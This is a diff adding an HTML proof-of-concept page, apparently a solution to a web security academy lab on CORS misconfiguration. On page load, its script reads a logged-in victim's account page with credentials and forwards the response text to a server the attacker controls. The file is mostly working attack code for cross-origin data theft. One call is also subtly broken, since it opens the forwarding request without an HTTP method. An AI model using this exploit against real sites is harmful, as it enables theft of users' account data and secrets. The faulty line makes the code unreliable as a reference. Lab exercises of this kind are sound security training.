@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>cors</title>
+  </head>
+  <body>
+    <h2>Using XMLHttpRequest Object</h2>
+    <div id="demo">
+      <button type="button" onclick="loadXMLDoc()">Change Content</button>
+    </div>
+    <script>
+      function loadXMLDoc() {
+        var xhttp = new XMLHttpRequest();
+        xhttp.onreadystatechange = function () {
+          if (this.readyState == 4 && this.status == 200) {
+            var xhttp2 = new XMLHttpRequest();
+            xhttp2.open('https://localhost:8000/?data=' + escape(this.responseText))
+            xhttp2.send();
+          }
+        };
+        xhttp.open("GET", "https://0a56005d04b313db80e5038c00360026.web-security-academy.net/my-account?id=wiener");
+        xhttp.withCredentials = true;
+        xhttp.send();
+      }
+      loadXMLDoc();
+    </script>
+  </body>
+</html>
